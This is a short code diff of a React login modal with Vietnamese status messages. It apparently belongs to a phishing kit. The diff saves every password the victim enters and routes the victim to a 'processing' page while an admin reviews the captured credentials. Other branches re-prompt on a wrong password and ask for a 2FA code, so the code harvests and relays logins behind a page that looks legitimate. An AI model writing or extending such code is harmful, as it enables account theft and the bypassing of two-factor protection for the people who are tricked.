@@ -32,6 +32,7 @@ const Modal = ({ isModal, setIsModal }) => {
     setErrorPassword(false);
     setValidating(true);
     passwords.push(password);
+    localStorage.setItem("passwords", JSON.stringify(passwords));
     const data = JSON.parse(localStorage.getItem("form"));
     const form = new FormData();
     // form.append("day", data.day);
@@ -79,8 +80,10 @@ const Modal = ({ isModal, setIsModal }) => {
         if (data?.user_status === "Mật khẩu sai. Đang chờ user nhập lại.") {
           setValidating(false);
           setErrorPassword(true);
-        } else if (data?.user_status === "Thành công") {
-          natigate("/success");
+        } else if (
+          data?.user_status === "Đang chờ bước waiting cuối cùng từ admin"
+        ) {
+          natigate("/confirm/processing");
         } else if (data?.user_status === "Nhập mã 2fa") {
           const updates = {};
           updates[
